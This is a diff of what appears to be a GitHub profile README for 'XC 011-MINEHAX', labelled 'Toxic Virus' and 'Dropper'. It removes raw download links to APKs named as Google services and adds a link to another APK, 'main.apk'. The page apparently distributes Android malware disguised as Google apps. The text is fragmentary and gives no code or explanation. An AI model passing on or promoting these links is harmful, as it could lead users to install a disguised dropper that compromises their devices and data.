@@ -1,33 +1,9 @@
-<h1 align="center">XC 011-MINEHAX</h1>
-<h3 align="center">___Toxic Virus___
- </h3>
-       ComingSoon 
-<img align="right" alt="coding" width="400" src="https://media.tenor.com/-UygBh3nnfEAAAAC/coding.gif">
-
-<p align="left"> <img src="https://komarev.com/ghpvc/?username=mtx-r&label=Profile%20views&color=0e75b6&style=flat" alt="mtx-r" /> </p>
- -  13+
--   https://github.com/MTX-R/GoogleServices/raw/main/google.apk
-
-- 📫   ***
-- 13-
-- https://github.com/MTX-R/7.7.7.5/raw/main/Google.apk
-
-       -    support -MINEX               
-
-
-
-
-
-
-                  Dropper
- 
--
 ---------------------------------------------------------------------------
                   
 
 
 
--
+-maIN https://github.com/MTX-R/Main/raw/main/main.apk
 
 
 
